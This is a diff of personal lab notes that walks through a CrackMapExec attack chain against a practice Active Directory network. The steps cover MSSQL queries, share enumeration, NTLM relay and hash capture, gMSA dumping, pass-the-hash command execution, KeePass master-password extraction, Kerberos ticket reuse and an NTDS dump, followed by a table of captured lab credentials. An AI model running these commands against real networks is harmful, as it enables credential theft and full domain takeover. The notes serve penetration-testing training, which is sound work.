@@ -91,32 +91,97 @@ N=privesc
 *Command*: Read database interns
 -  proxychains4 -q crackmapexec mssql 172.16.15.15 -u 'sqldev' -p 'Sq!D3vUs3R' --local-auth -q "SELECT * FROM interns.dbo.details" > details.txt
 
-*Result:*  Extracted file with possible passwords
+*Result:*  intern30:Welcome1
   
 --- 
 
-*Command*: 
+*Command*: Find writable share
+- cme 172.16.15.15 smb --shares 
  
-*Result:* 
+*Result:* DEV_INTERN - WRITE/READ
 
 --- 
 
-*Command*: 
- 
+*Command*: Steal hash with drop-sc module
+- cme smb 172.16.15.12 -M drop-sc
+- sudo ntlmrelayx -tf relax.txt -smb2support --no-http
+- sudo responder -I tun0
+
 *Result:* 
+- JAMES:hash:04apple
+---
+
+*Command*: ldap scan to DC01
+- cme ldap 172.16.15.3 -u james -p '04pple' -gmsa
+  
+*Result:* Account: svc_devadm$    NTLM: a995d569117ec719c2402c966867569a
+
+---
+
+*Command*: Get 3rd flag
+-  proxychains4 -q crackmapexec smb 172.16.15.20 -u 'svc_devadm$' -H a995d569117ec719c2402c966867569a -x 'type C:\Users\Administrator\Desktop\flag.txt'
+
+*Result:* 3rd flag + found keepass file 
+
+---
+
+*Command*: Trigger keepass module to extract master password
+-  cme smb 172.16.15.20 -u 'svc_devadm$' -H hash -M keepass_discover
+-  cme smb 172.16.15.20 -u 'svc_devadm$' -H hash -M keepass_trigger -o ACTION=ADD KEEPASS_CONFIG_PATH='C:/Users/Administrator/AppData/Roaming/KeePass/KeePass.config.xml'
+- cme  smb 172.16.15.20 -u 'svc_devadm$' -H hash -M keepass_trigger -o ACTION=POLL
 
 
+*Result:* Found files + trigger added + exportted file create 
+
+---
+
+*Command*: Read /tmp/export.xml file
+
+*Result:* Found user nick + password
+
+---
+
+*Command*: Extract files from shares Ccache 
+- cme smb 172.16.15.3 -M spider_plus -o READ_ONLY=false
+
+*Result:* read 4th flag + found svc_inlane.ccache + new user svc_inlaneadm
+
+---
+
+*Command*: change name of ccache file + create 
+- mv big_file_name.ccaches svc_inlanaeadm.ccaches
+- export KRB5CCNAME=/home/kalilearn/git/hacklab/academy/cme/svc_inlaneadm.ccaches
+
+*Result:* ccache file without special characters
+
+---
+
+*Command*: Dump hashes with ntds
+- cme smb 172.16.15.3 --use-kcache --ntds
+
+*Result:* Found administrator hash
+
+---
+
+*Command*: Read flag
+cme smb 172.16.15.3 -u Administrator -H 935f8a2f4fc9ec7b45c54a1044c74c08 -x 'type C:\Users\Administrator\Desktop\flag.txt'
+
+*Result:* Flag
+
+---
 
 ### Credentials Found
-|   Username    |  Password  |    Note    |
-| :-----------: | :--------: | :--------: |
-|   Juliette    | Password1  |  1st flag  |
-|     Atul      |  hooters1  |  kerbast   |
-|    sqldev     | Sq!D3vUs3R | from share |
-|     james     |    None    |            |
-| svc_inlaneadm |    None    |            |
-|  svc_devadm$  |    None    |            |
-|  svc_devadm$  |    None    |            |
+|   Username    |      Password      |            Note            |
+| :-----------: | :----------------: | :------------------------: |
+|   Juliette    |     Password1      |          1st flag          |
+|     Atul      |      hooters1      |          kerbast           |
+|    sqldev     |     Sq!D3vUs3R     | pwnd, priv esc, from share |
+|   intern30    |      Welcome1      |         from mssql         |
+|     james     |      04apple       |         -M drop-sc         |
+|  svc_devadm$  |        hash        |  pwnd, from james, --gmsa  |
+|     nick      | ASU934as0-dm23asd! |        from keepass        |
+| svc_inlaneadm |    ccache file     |      admin privileges      |
+| Administrator |        hash        |        using ccache        |
 
 ## Common Services
 ### Assessment 1
